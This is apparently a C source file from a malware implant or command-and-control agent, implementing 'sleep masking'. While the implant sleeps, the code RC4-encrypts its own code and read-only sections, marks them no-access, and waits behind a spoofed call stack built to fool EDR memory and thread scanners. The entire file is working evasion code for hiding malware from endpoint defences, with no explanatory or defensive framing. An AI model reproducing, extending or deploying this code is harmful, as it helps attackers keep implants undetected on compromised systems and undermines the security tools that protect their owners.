/*
 * sleep_mask.c — Obfuscated sleep: full-image RC4 masking + thread-stack spoofing.
 *
 * All functions except SleepMasked's entry check live in the .slpmsk section so
 * they continue to execute after the implant's own .text is set PAGE_NOACCESS.
 *
 * Masking strategy:
 *   - FindMaskableSections collects all PE sections that are NOT .slpmsk and NOT
 *     writable (.text, .rdata, …).  Writable sections (.data, .bss) are skipped
 *     because they contain globals required during sleep (g_gadget, g_wait_ssn, …).
 *   - A single RC4 stream is applied across all collected sections in order; the
 *     same stream decrypts them on wake (XOR is its own inverse).
 *   - SlpNtProtect (in .slpmsk, uses g_protect_ssn) replaces NtProtect calls.
 *   - SlpTimerThread (in .slpmsk) signals the wake event; it only calls kernel32
 *     APIs (Sleep, SetEvent) which are never masked.
 *   - SlpSpoofedWait (in .slpmsk, mirrors SpoofedNtWait) waits on the event with
 *     a multi-level fake call stack visible to EDR sleeping-thread scanners.
 */
#include "../include/implant.h"
#include "../include/obfstr.h"
#include <string.h>

#pragma GCC push_options
#pragma GCC optimize("O0")

/* ── RC4 ─────────────────────────────────────────────────────────────────── */

typedef struct { BYTE S[256]; BYTE i; BYTE j; } RC4State;

__attribute__((section(".slpmsk")))
static void RC4Init(RC4State *rc4, const BYTE *key, DWORD keyLen) {
    for (int i = 0; i < 256; i++) rc4->S[i] = (BYTE)i;
    BYTE j = 0;
    for (int i = 0; i < 256; i++) {
        j = j + rc4->S[i] + key[i % keyLen];
        BYTE t = rc4->S[i]; rc4->S[i] = rc4->S[j]; rc4->S[j] = t;
    }
    rc4->i = rc4->j = 0;
}

__attribute__((section(".slpmsk")))
static void RC4Apply(RC4State *rc4, BYTE *buf, DWORD len) {
    for (DWORD k = 0; k < len; k++) {
        rc4->i++;
        rc4->j += rc4->S[rc4->i];
        BYTE t = rc4->S[rc4->i]; rc4->S[rc4->i] = rc4->S[rc4->j]; rc4->S[rc4->j] = t;
        buf[k] ^= rc4->S[(BYTE)(rc4->S[rc4->i] + rc4->S[rc4->j])];
    }
}

/* ── Section enumeration ──────────────────────────────────────────────────── */

#define MAX_MASK_SECTIONS 8

typedef struct {
    PVOID  base;
    SIZE_T size;
    ULONG  orig_prot; /* PAGE_EXECUTE_READ or PAGE_READONLY */
} MaskSection;

__attribute__((section(".slpmsk")))
static int FindMaskableSections(MaskSection *secs, int maxSecs) {
    PVOID peb      = (PVOID)READ_GS_QWORD(0x60);
    BYTE *imgBase  = *(BYTE**)((BYTE*)peb + 0x10);
    PIMAGE_NT_HEADERS    nt  = (PIMAGE_NT_HEADERS)(imgBase + ((PIMAGE_DOS_HEADER)imgBase)->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    int count = 0;

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections && count < maxSecs; i++) {
        if (!sec[i].Misc.VirtualSize || !sec[i].VirtualAddress) continue;
        /* Skip .slpmsk — must stay executable during sleep */
        if (memcmp(sec[i].Name, ".slpmsk", 7) == 0) continue;
        /* Skip writable sections (.data, .bss) — globals needed during sleep live here */
        if (sec[i].Characteristics & IMAGE_SCN_MEM_WRITE) continue;

        secs[count].base = imgBase + sec[i].VirtualAddress;
        secs[count].size = sec[i].Misc.VirtualSize;
        secs[count].orig_prot =
            (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
            ? PAGE_EXECUTE_READ : PAGE_READONLY;
        count++;
    }
    return count;
}

/* ── Timer-thread trampoline (.slpmsk) ───────────────────────────────────── */

typedef struct { HANDLE hEvent; DWORD ms; } TimerArg;

__attribute__((section(".slpmsk")))
static DWORD WINAPI SlpTimerThread(LPVOID p) {
    TimerArg *a = (TimerArg*)p;
    Sleep(a->ms);
    SetEvent(a->hEvent);
    return 0;
}

/* ── Public ──────────────────────────────────────────────────────────────── */

__attribute__((section(".slpmsk")))
void SleepMasked(LONGLONG ms) {
    if (!g_agent.sleep_mask) {
        NtDelay(ms * 10000LL);
        return;
    }

    MaskSection secs[MAX_MASK_SECTIONS];
    int nSecs = FindMaskableSections(secs, MAX_MASK_SECTIONS);
    if (nSecs <= 0) {
        NtDelay(ms * 10000LL);
        return;
    }

    RC4State rc4;
    RC4Init(&rc4, g_agent.aes_key, AES_KEY_LEN);

    /* Step 1 — set all maskable sections RW, then RC4-encrypt (one stream) */
    for (int i = 0; i < nSecs; i++) {
        PVOID  b = secs[i].base;
        SIZE_T s = secs[i].size;
        ULONG  old = 0;
        SlpNtProtect((HANDLE)(LONG_PTR)-1, &b, &s, PAGE_READWRITE, &old);
        RC4Apply(&rc4, (BYTE*)secs[i].base, (DWORD)secs[i].size);
    }

    /* Step 2 — set all to PAGE_NOACCESS */
    for (int i = 0; i < nSecs; i++) {
        PVOID  b = secs[i].base;
        SIZE_T s = secs[i].size;
        ULONG  old = 0;
        SlpNtProtect((HANDLE)(LONG_PTR)-1, &b, &s, PAGE_NOACCESS, &old);
    }

    /* Step 3 — timer thread + spoofed wait (all code from here in .slpmsk) */
    HANDLE hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    if (hEvent) {
        TimerArg ta = { hEvent, (DWORD)(ms & 0xFFFFFFFF) };
        HANDLE hTimer = CreateThread(NULL, 0, SlpTimerThread, &ta, 0, NULL);

        if (hTimer) {
            LARGE_INTEGER timeout;
            timeout.QuadPart = -(LONGLONG)ms * 10000LL;
            SlpSpoofedWait(hEvent, FALSE, &timeout);
            CloseHandle(hTimer);
        } else {
            Sleep((DWORD)ms);
        }
        CloseHandle(hEvent);
    } else {
        Sleep((DWORD)ms);
    }

    /* Step 4 — set all back to RW, RC4-decrypt (same stream = XOR inverse) */
    for (int i = 0; i < nSecs; i++) {
        PVOID  b = secs[i].base;
        SIZE_T s = secs[i].size;
        ULONG  old = 0;
        SlpNtProtect((HANDLE)(LONG_PTR)-1, &b, &s, PAGE_READWRITE, &old);
    }

    RC4Init(&rc4, g_agent.aes_key, AES_KEY_LEN);  /* reset to same keystream */
    for (int i = 0; i < nSecs; i++) {
        RC4Apply(&rc4, (BYTE*)secs[i].base, (DWORD)secs[i].size);
    }

    /* Step 5 — restore original per-section protections */
    for (int i = 0; i < nSecs; i++) {
        PVOID  b = secs[i].base;
        SIZE_T s = secs[i].size;
        ULONG  old = 0;
        SlpNtProtect((HANDLE)(LONG_PTR)-1, &b, &s, secs[i].orig_prot, &old);
    }
}

#pragma GCC pop_options
